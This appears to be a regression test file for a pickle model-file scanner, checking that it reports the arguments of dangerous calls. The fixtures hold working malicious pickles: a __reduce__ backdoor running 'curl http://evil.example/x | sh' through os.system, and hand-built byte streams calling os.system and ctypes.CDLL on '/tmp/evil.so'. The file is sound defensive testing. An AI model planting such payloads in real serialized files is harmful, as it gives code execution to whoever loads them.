"""Regression tests for GitHub issue #151: MFV pickle REDUCE/NEWOBJ/BUILD
argument-level evidence.

`_resolve_pickle_globals` previously tracked only string-push and memo
opcodes -- enough to resolve a GLOBAL/STACK_GLOBAL reference to a
`module.name` string, but nothing about how (or whether) it was actually
*called*. A finding could say a pickle references `os.system`, but never
what argument it would run with. This mirrors (a scoped subset of) Trail of
Bits' fickling, which does full pickle-VM symbolic execution including
REDUCE.

These fixtures cover the three evidence tiers the scanner now distinguishes:

  (a) a dangerous global is referenced but never reduced/called -- callable
      name only, exactly like before.
  (b) a dangerous global is reduced (or constructed via NEWOBJ/NEWOBJ_EX)
      with a literal argument -- the concrete argument is now resolved and
      surfaced in the MFV-PICKLE-001 message.
  (c) a dangerous global is reduced with a non-literal/dynamic argument
      (built from another REDUCE's return value) -- falls back to
      callable-only reporting; the scanner never guesses at a value it
      can't verify.
"""

from __future__ import annotations

import pickle
import pickletools

from hayward.findings import Severity
from hayward.scanner import ModelFileScanner, _resolve_pickle_globals


class _ReferencedNotCalled:
    """Pushes a dangerous global onto the pickle VM stack via STACK_GLOBAL
    but never REDUCEs/calls it -- the mere reference is still evidence
    (existing behavior), but there is no call to resolve arguments for."""

    def __reduce__(self):
        return (str, ("harmless",))


def _referenced_not_called_bytes() -> bytes:
    """Hand-built protocol-4 stream: resolve `os.system` via STACK_GLOBAL,
    discard it (POP), then finish with an unrelated benign value. Mirrors
    what a pickle would look like if `os.system` were merely imported/
    referenced (e.g. assigned to an attribute) rather than invoked."""
    return (
        b"\x80\x04"
        + b"\x8c\x02os\x94"       # SHORT_BINUNICODE 'os' + MEMOIZE
        + b"\x8c\x06system\x94"   # SHORT_BINUNICODE 'system' + MEMOIZE
        + b"\x93\x94"             # STACK_GLOBAL + MEMOIZE -> pushes 'os.system' ref
        + b"0"                    # POP -- reference discarded, never reduced
        + b"N"                    # NONE -- final (benign) top-level value
        + b"."                    # STOP
    )


class _ReducedWithLiteralArg:
    """A real __reduce__-based backdoor: os.system called with a literal,
    fully-resolvable shell command string."""

    def __reduce__(self):
        import os
        return (os.system, ("curl http://evil.example/x | sh",))


class _ReducedWithDynamicArg:
    """os.system's argument is itself the return value of another REDUCE
    call (str.upper(...)), not a literal already on the stack -- the
    scanner can't know statically what that call returns, so it must not
    fabricate an argument value."""

    def __reduce__(self):
        import os
        return (os.system, (_DynamicArg(),))


class _DynamicArg:
    def __reduce__(self):
        return (str.upper, ("not-a-literal-once-reduced",))


def _newobj_with_literal_arg_bytes() -> bytes:
    """Hand-built protocol-4 stream exercising NEWOBJ (protocol 2+'s
    cls.__new__(cls, *args) construction opcode -- how most modern PyTorch
    pickles actually build tensors/objects) with a dangerous class and a
    literal argument: ctypes.CDLL('/tmp/evil.so').

    pickle.dumps() can't produce this directly -- the C pickler's own
    __newobj__ writer enforces that the "cls" argument equals the actual
    type of the object being serialized, a write-side safety net that
    doesn't apply to a hand-crafted malicious byte stream (which isn't
    bound by what any real Pickler would emit)."""
    return (
        b"\x80\x04"
        + b"\x8c\x06ctypes\x94"      # SHORT_BINUNICODE 'ctypes' + MEMOIZE
        + b"\x8c\x04CDLL\x94"        # SHORT_BINUNICODE 'CDLL' + MEMOIZE
        + b"\x93\x94"                 # STACK_GLOBAL + MEMOIZE -> 'ctypes.CDLL' ref
        + b"\x8c\x0c/tmp/evil.so\x94"  # SHORT_BINUNICODE literal path + MEMOIZE
        + b"\x85\x94"                  # TUPLE1 + MEMOIZE -> ('/tmp/evil.so',)
        + b"\x81\x94"                  # NEWOBJ + MEMOIZE
        + b"."                          # STOP
    )


class TestPickleReduceArgumentResolution:
    def test_dangerous_global_referenced_but_never_called(self, tmp_path):
        """(a) A dangerous global appears on the stack but is never
        REDUCEd/called -- MFV-PICKLE-001 still fires (presence is enough
        evidence), but with no resolved call, the message reports the bare
        callable name exactly as before."""
        data = _referenced_not_called_bytes()

        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        assert "os.system" in globals_found
        assert resolved_calls == []

        p = tmp_path / "referenced_only.pkl"
        p.write_bytes(data)
        findings = ModelFileScanner().scan_file(p)

        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert critical[0].severity == Severity.CRITICAL
        assert "os.system" in critical[0].message
        # No resolved-call evidence for this ref -- must not fabricate args.
        assert "os.system(" not in critical[0].message
        assert critical[0].metadata.get("denied_calls") == {}

    def test_dangerous_global_reduced_with_literal_argument(self, tmp_path):
        """(b) os.system is REDUCEd with a literal, fully-resolved shell
        command -- MFV-PICKLE-001's message must include the resolved
        argument, e.g. os.system('curl ... | sh') instead of bare
        os.system."""
        p = tmp_path / "reduced_literal.pkl"
        p.write_bytes(pickle.dumps(_ReducedWithLiteralArg(), protocol=4))

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert critical[0].severity == Severity.CRITICAL

        message = critical[0].message
        assert "system(" in message, f"expected a resolved call expression, got: {message!r}"
        assert "curl http://evil.example/x | sh" in message

        denied_calls = critical[0].metadata.get("denied_calls", {})
        assert denied_calls, "expected denied_calls metadata to carry the resolved call"
        assert any("curl http://evil.example/x | sh" in v for v in denied_calls.values())

    def test_dangerous_global_reduced_with_dynamic_argument_reports_callable_only(self, tmp_path):
        """(c) os.system is called with the *result* of another REDUCE
        (str.upper(...)), not a literal already on the stack -- the scanner
        must not guess at that value, so the message/metadata fall back to
        reporting the bare callable, exactly like the no-call case."""
        p = tmp_path / "reduced_dynamic.pkl"
        p.write_bytes(pickle.dumps(_ReducedWithDynamicArg(), protocol=4))

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert critical[0].severity == Severity.CRITICAL

        message = critical[0].message
        assert "os.system" in message or "posix.system" in message
        # Must not have synthesized a call expression for the dynamic arg.
        assert "system(" not in message
        assert "not-a-literal-once-reduced" not in message

    def test_newobj_construction_with_literal_argument_is_resolved(self, tmp_path):
        """NEWOBJ (protocol 2+'s cls.__new__(cls, *args) construction
        opcode -- how most modern PyTorch pickles build tensors/objects)
        must resolve a literal argument the same way REDUCE does."""
        data = _newobj_with_literal_arg_bytes()
        # Sanity-check this fixture actually goes through NEWOBJ, not REDUCE.
        opnames = [op.name for op, _arg, _pos in pickletools.genops(data)]
        assert "NEWOBJ" in opnames, f"fixture didn't produce a NEWOBJ opcode: {opnames}"
        assert "REDUCE" not in opnames

        p = tmp_path / "newobj_literal.pkl"
        p.write_bytes(data)

        findings = ModelFileScanner().scan_file(p)
        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert "ctypes.CDLL" in critical[0].message
        assert "/tmp/evil.so" in critical[0].message

    def test_build_opcode_keeps_stack_synced_after_reduce(self, tmp_path):
        """BUILD (obj.__setstate__(state)) follows a REDUCE/NEWOBJ in the
        common "construct then restore state" pattern. It must not desync
        the simulated stack such that a later opcode misreads leftover
        state as a call argument."""
        data = (
            b"\x80\x04"
            + b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94"  # STACK_GLOBAL -> 'os.system'
            + b"\x8c\x0becho pwned2\x94"                    # literal arg string
            + b"\x85\x94"                                    # TUPLE1 + MEMOIZE
            + b"R\x94"                                        # REDUCE + MEMOIZE -> call recorded, opaque result on stack
            + b"}\x94"                                        # EMPTY_DICT + MEMOIZE (the "state")
            + b"b"                                             # BUILD -- pops state, leaves the REDUCE result on top
            + b"."                                             # STOP
        )
        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        assert "os.system" in globals_found
        assert len(resolved_calls) == 1
        assert resolved_calls[0].ref == "os.system"
        assert resolved_calls[0].args == ("echo pwned2",)
